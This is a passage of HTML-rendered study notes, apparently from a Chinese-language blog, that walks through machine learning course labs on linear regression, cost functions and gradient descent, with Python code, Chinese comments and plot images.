punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># m is the number of training examples</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"x_train.shape: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>x_train<span class="token punctuation">.</span>shape<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>m <span class="token operator">=</span> x_train<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Number of training examples is: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># Change this to 1 to see (x^1, y^1)</span>x_i <span class="token operator">=</span> x_train<span class="token punctuation">[</span>i<span class="token punctuation">]</span>y_i <span class="token operator">=</span> y_train<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(x^(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">), y^(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)) = (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x_i<span class="token punctuation">&#125;</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>y_i<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span><span class="token comment"># Plot the data points</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token comment"># Set the title</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Housing Prices"</span><span class="token punctuation">)</span><span class="token comment"># Set the y-axis label</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Price (in 1000s of dollars)'</span><span class="token punctuation">)</span><span class="token comment"># Set the x-axis label</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Size (1000 sqft)'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>w <span class="token operator">=</span> <span class="token number">100</span>b <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"w: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>w<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"b: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compute_model_output</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> w<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Computes the prediction of a linear model    Args:      x (ndarray (m,)): Data, m examples       w,b (scalar)    : model parameters      Returns      y (ndarray (m,)): target values    """</span>    m <span class="token operator">=</span> x<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    f_wb <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment"># 创建了一个全零的 NumPy 数组 f_wb。</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>        f_wb<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> w <span class="token operator">*</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> b            <span class="token keyword">return</span> f_wbtmp_f_wb <span class="token operator">=</span> compute_model_output<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> w<span class="token punctuation">,</span> b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment"># Plot our model prediction</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> tmp_f_wb<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'Our Prediction'</span><span class="token punctuation">)</span> <span class="token comment"># 线性</span><span class="token comment"># Plot the data points</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'Actual Values'</span><span class="token punctuation">)</span> <span class="token comment"># 散点图</span><span class="token comment"># Set the title</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Housing Prices"</span><span class="token punctuation">)</span><span class="token comment"># Set the y-axis label</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Price (in 1000s of dollars)'</span><span class="token punctuation">)</span><span class="token comment"># Set the x-axis label</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Size (1000 sqft)'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 创建一个图例，该图例显示图表中各种数据集的标签，以便识别不同的数据集。</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><figure><img src="https://s2.loli.net/2023/02/10/9otHVn5A8eXUlOE.png"alt="image-20230210203145072" /><figcaption aria-hidden="true">image-20230210203145072</figcaption></figure><h3id="c1_w1_lab03_cost_function_soln">C1_W1_Lab03_Cost_function_Soln</h3><ul><li><p>安装库(管理员权限)</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">conda install <span class="token operator">-</span>c conda-forge ipympl</code></pre></li><li><p>code</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token operator">%</span>matplotlib widget <span class="token comment"># 使用 %matplotlib widget 命令与 Jupyter Notebook 交互，使得可以在 Jupyter Notebook 中直接使用 matplotlib 库的图形界面；</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> lab_utils_uni <span class="token keyword">import</span> plt_intuition<span class="token punctuation">,</span> plt_stationary<span class="token punctuation">,</span> plt_update_onclick<span class="token punctuation">,</span> soup_bowlplt<span class="token punctuation">.</span>style<span class="token punctuation">.</span>use<span class="token punctuation">(</span><span class="token string">'./deeplearning.mplstyle'</span><span class="token punctuation">)</span>x_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>           <span class="token comment">#(size in 1000 square feet)</span>y_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">300.0</span><span class="token punctuation">,</span> <span class="token number">500.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>           <span class="token comment">#(price in 1000s of dollars)</span><span class="token keyword">def</span> <span class="token function">compute_cost</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> w<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token triple-quoted-string string">"""    Computes the cost function for linear regression.        Args:      x (ndarray (m,)): Data, m examples       y (ndarray (m,)): target values      w,b (scalar)    : model parameters          Returns        total_cost (float): The cost of using w,b as the parameters for linear regression               to fit the data points in x and y    """</span>    <span class="token comment"># number of training examples</span>    m <span class="token operator">=</span> x<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>         cost_sum <span class="token operator">=</span> <span class="token number">0</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>         f_wb <span class="token operator">=</span> w <span class="token operator">*</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> b           cost <span class="token operator">=</span> <span class="token punctuation">(</span>f_wb <span class="token operator">-</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span>          cost_sum <span class="token operator">=</span> cost_sum <span class="token operator">+</span> cost      total_cost <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> cost_sum      <span class="token keyword">return</span> total_costplt_intuition<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">)</span>  <span class="token comment"># 该函数的目的是创建一个散点图，用于展示训练数据的分布情况。该图形将训练数据的 x_train 值作为 x 轴，y_train 值作为 y 轴，并在散点图上显示出每一个数据点的位置。</span>x_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">1.7</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">2.5</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token punctuation">,</span> <span class="token number">3.2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">480</span><span class="token punctuation">,</span>  <span class="token number">430</span><span class="token punctuation">,</span>   <span class="token number">630</span><span class="token punctuation">,</span> <span class="token number">730</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token string">'all'</span><span class="token punctuation">)</span> fig<span class="token punctuation">,</span> ax<span class="token punctuation">,</span> dyn_items <span class="token operator">=</span> plt_stationary<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">)</span>updater <span class="token operator">=</span> plt_update_onclick<span class="token punctuation">(</span>fig<span class="token punctuation">,</span> ax<span class="token punctuation">,</span> x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> dyn_items<span class="token punctuation">)</span></code></pre></li><li><p>解释<img src="https://s2.loli.net/2023/02/10/csGQAyEhCqnLDfP.png"alt="image-20230210233315478" /></p></li></ul><h3id="c1_w1_lab04_gradient_descent_soln">C1_W1_Lab04_Gradient_Descent_Soln</h3><ul><li><p>code</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> math<span class="token punctuation">,</span> copy<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>style<span class="token punctuation">.</span>use<span class="token punctuation">(</span><span class="token string">'./deeplearning.mplstyle'</span><span class="token punctuation">)</span><span class="token keyword">from</span> lab_utils_uni <span class="token keyword">import</span> plt_house_x<span class="token punctuation">,</span> plt_contour_wgrad<span class="token punctuation">,</span> plt_divergence<span class="token punctuation">,</span> plt_gradients<span class="token comment"># Load our data set</span>x_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">#features</span>y_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">300.0</span><span class="token punctuation">,</span> <span class="token number">500.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">#target value</span><span class="token comment">#Function to calculate the cost</span><span class="token keyword">def</span> <span class="token function">compute_cost</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> w<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>       m <span class="token operator">=</span> x<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>     cost <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>        f_wb <span class="token operator">=</span> w <span class="token operator">*</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> b        cost <span class="token operator">=</span> cost <span class="token operator">+</span> <span class="token punctuation">(</span>f_wb <span class="token operator">-</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">2</span>    total_cost <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> cost    <span class="token keyword">return</span> total_cost<span class="token keyword">def</span> <span class="token function">compute_gradient</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> w<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token triple-quoted-string string">"""    Computes the gradient for linear regression     Args:      x (ndarray (m,)): Data, m examples       y (ndarray (m,)): target values      w,b (scalar)    : model parameters      Returns      dj_dw (scalar): The gradient of the cost w.r.t. the parameters w      dj_db (scalar): The gradient of the cost w.r.t. the parameter b          """</span>        <span class="token comment"># Number of training examples</span>    m <span class="token operator">=</span> x<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        dj_dw <span class="token operator">=</span> <span class="token number">0</span>    dj_db <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>          f_wb <span class="token operator">=</span> w <span class="token operator">*</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> b         dj_dw_i <span class="token operator">=</span> <span class="token punctuation">(</span>f_wb <span class="token operator">-</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span>         dj_db_i <span class="token operator">=</span> f_wb <span class="token operator">-</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span>         dj_db <span class="token operator">+=</span> dj_db_i        dj_dw <span class="token operator">+=</span> dj_dw_i     dj_dw <span class="token operator">=</span> dj_dw <span class="token operator">/</span> m     dj_db <span class="token operator">=</span> dj_db <span class="token operator">/</span> m             <span class="token keyword">return</span> dj_dw<span class="token punctuation">,</span> dj_dbplt_gradients<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">,</span> compute_cost<span class="token punctuation">,</span> compute_gradient<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gradient_descent</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> w_in<span class="token punctuation">,</span> b_in<span class="token punctuation">,</span> alpha<span class="token punctuation">,</span> num_iters<span class="token punctuation">,</span> cost_function<span class="token punctuation">,</span> gradient_function<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token triple-quoted-string string">"""    Performs gradient descent to fit w,b. Updates w,b by taking     num_iters gradient steps with learning rate alpha        Args:      x (ndarray (m,))  : Data, m examples       y (ndarray (m,))  : target values      w_in,b_in (scalar): initial values of model parameters        alpha (float):     Learning rate      num_iters (int):   number of iterations to run gradient descent      cost_function:     function to call to produce cost      gradient_function: function to call to produce gradient          Returns:      w (scalar): Updated value of parameter after running gradient descent      b (scalar): Updated value of parameter after running gradient descent      J_history (List): History of cost values      p_history (list): History of parameters [w,b]       """</span>        w <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>w_in<span class="token punctuation">)</span> <span class="token comment"># avoid modifying global w_in</span>    <span class="token comment"># An array to store cost J and w's at each iteration primarily for graphing later</span>    J_history <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    p_history <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    b <span class="token operator">=</span> b_in    w <span class="token operator">=</span> w_in        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_iters<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Calculate the gradient and update the parameters using gradient_function</span>        dj_dw<span class="token punctuation">,</span> dj_db <span class="token operator">=</span> gradient_function<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> w <span class="token punctuation">,</span> b<span class="token punctuation">)</span>             <span class="token comment"># Update Parameters using equation (3) above</span>        b <span class="token operator">=</span> b <span class="token operator">-</span> alpha <span class="token operator">*</span> dj_db                                    w <span class="token operator">=</span> w <span class="token operator">-</span> alpha <span class="token operator">*</span> dj_dw                                    <span class="token comment"># Save cost J at each iteration</span>        <span class="token keyword">if</span> i<span class="token operator">&lt;</span><span class="token number">100000</span><span class="token punctuation">:</span>      <span class="token comment"># prevent resource exhaustion </span>            J_history<span class="token punctuation">.</span>append<span class="token punctuation">(</span> cost_function<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> w <span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span>            p_history<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>w<span class="token punctuation">,</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># Print cost every at intervals 10 times or as many iterations if &lt; 10</span>        <span class="token keyword">if</span> i<span class="token operator">%</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>num_iters<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token comment"># 迭代次数划分为10份</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Iteration </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token format-spec">4</span><span class="token punctuation">&#125;</span></span><span class="token string">: Cost </span><span class="token interpolation"><span class="token punctuation">&#123;</span>J_history<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token format-spec">0.2e</span><span class="token punctuation">&#125;</span></span><span class="token string"> "</span></span><span class="token punctuation">,</span>                  <span class="token string-interpolation"><span class="token string">f"dj_dw: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dj_dw<span class="token punctuation">:</span><span class="token format-spec"> 0.3e</span><span class="token punctuation">&#125;</span></span><span class="token string">, dj_db: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dj_db<span class="token punctuation">:</span><span class="token format-spec"> 0.3e</span><span class="token punctuation">&#125;</span></span><span class="token string">  "</span></span><span class="token punctuation">,</span>                  <span class="token string-interpolation"><span class="token string">f"w: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>w<span class="token punctuation">:</span><span class="token format-spec"> 0.3e</span><span class="token punctuation">&#125;</span></span><span class="token string">, b:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">:</span><span class="token format-spec"> 0.5e</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>     <span class="token keyword">return</span> w<span class="token punctuation">,</span> b<span class="token punctuation">,</span> J_history<span class="token punctuation">,</span> p_history <span class="token comment">#return w and J,w history for graphing</span><span class="token comment"># initialize parameters</span>w_init <span class="token operator">=</span> <span class="token number">0</span>b_init <span class="token operator">=</span> <span class="token number">0</span><span class="token comment"># some gradient descent settings</span>iterations <span class="token operator">=</span> <span class="token number">10000</span>tmp_alpha <span class="token operator">=</span> <span class="token number">1.0e-2</span><span class="token comment"># run gradient descent</span>w_final<span class="token punctuation">,</span> b_final<span class="token punctuation">,</span> J_hist<span class="token punctuation">,</span> p_hist <span class="token operator">=</span> gradient_descent<span class="token punctuation">(</span>x_train <span class="token punctuation">,</span>y_train<span class="token punctuation">,</span> w_init<span class="token punctuation">,</span> b_init<span class="token punctuation">,</span> tmp_alpha<span class="token punctuation">,</span>                                                     iterations<span class="token punctuation">,</span> compute_cost<span class="token punctuation">,</span> compute_gradient<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(w,b) found by gradient descent: (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>w_final<span class="token punctuation">:</span><span class="token format-spec">8.4f</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>b_final<span class="token punctuation">:</span><span class="token format-spec">8.4f</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span><span class="token comment"># plot cost versus iteration  </span>fig<span class="token punctuation">,</span> <span class="token punctuation">(</span>ax1<span class="token punctuation">,</span> ax2<span class="token punctuation">)</span> <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> constrained_layout<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ax1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>J_hist<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token number">1000</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>J_hist<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> J_hist<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ax1<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cost vs. iteration(start)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ax2<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cost vs. iteration (end)"</span><span class="token punctuation">)</span>ax1<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'Cost'</span><span class="token punctuation">)</span>            <span class="token punctuation">;</span>  ax2<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'Cost'</span><span class="token punctuation">)</span> ax1<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">'iteration step'</span><span class="token punctuation">)</span>  <span class="token punctuation">;</span>  ax2<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">'iteration step'</span><span class="token punctuation">)</span> plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"1000 sqft house prediction </span><span class="token interpolation"><span class="token punctuation">&#123;</span>w_final<span class="token operator">*</span><span class="token number">1.0</span> <span class="token operator">+</span> b_final<span class="token punctuation">:</span><span class="token format-spec">0.1f</span><span class="token punctuation">&#125;</span></span><span class="token string"> Thousand dollars"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"1200 sqft house prediction </span><span class="token interpolation"><span class="token punctuation">&#123;</span>w_final<span class="token operator">*</span><span class="token number">1.2</span> <span class="token operator">+</span> b_final<span class="token punctuation">:</span><span class="token format-spec">0.1f</span><span class="token punctuation">&#125;</span></span><span class="token string"> Thousand dollars"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"2000 sqft house prediction </span><span class="token interpolation"><span class="token punctuation">&#123;</span>w_final<span class="token operator">*</span><span class="token number">2.0</span> <span class="token operator">+</span> b_final<span class="token punctuation">:</span><span class="token format-spec">0.1f</span><span class="token punctuation">&#125;</span></span><span class="token string"> Thousand dollars"</span></span><span class="token punctuation">)</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt_contour_wgrad<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> p_hist<span class="token punctuation">,</span> ax<span class="token punctuation">)</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt_contour_wgrad<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> p_hist<span class="token punctuation">,</span> ax<span class="token punctuation">,</span> w_range<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b_range<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            contours<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span>resolution<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token comment"># initialize parameters</span>w_init <span class="token operator">=</span> <span class="token number">0</span>b_init <span class="token operator">=</span> <span class="token number">0</span><span class="token comment"># set alpha to a large value</span>iterations <span class="token operator">=</span> <span class="token number">10</span>tmp_alpha <span class="token operator">=</span> <span class="token number">8.0e-1</span><span class="token comment"># run gradient descent</span>w_final<span class="token punctuation">,</span> b_final<span class="token punctuation">,</span> J_hist<span class="token punctuation">,</span> p_hist <span class="token operator">=</span> gradient_descent<span class="token punctuation">(</span>x_train <span class="token punctuation">,</span>y_train<span class="token punctuation">,</span> w_init<span class="token punctuation">,</span> b_init<span class="token punctuation">,</span> tmp_alpha<span class="token punctuation">,</span>                                                     iterations<span class="token punctuation">,</span> compute_cost<span class="token punctuation">,</span> compute_gradient<span class="token punctuation">)</span>plt_divergence<span class="token punctuation">(</span>p_hist<span class="token punctuation">,</span> J_hist<span class="token punctuation">,</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">)</span> <span class="token comment"># 具体内容与 plt_contour_wgrad 函数类似，只不过它是绘制参数空间与代价空间的散度图（Divergence Plot）</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li><li><p>输出</p><ul><li><figure><img src="https://s2.loli.net/2023/02/11/iPsAv4aY37H6KmO.png"alt="image-20230211012317976" /><figcaption aria-hidden="true">image-20230211012317976</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/02/11/9uSTdVya7xPQKOk.png"alt="image-20230211014635813" /><figcaption aria-hidden="true">image-20230211014635813</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/02/11/cIOlx2F9hyqD8aV.png"alt="image-20230211014654576" /><figcaption aria-hidden="true">image-20230211014654576</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/02/11/bLTpCKgsUIDaq3P.png"alt="image-20230211014708143" /><figcaption aria-hidden="true">image-20230211014708143</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/02/11/P8kbS7NET6Ghsri.png"alt="image-20230211020052998" /><figcaption 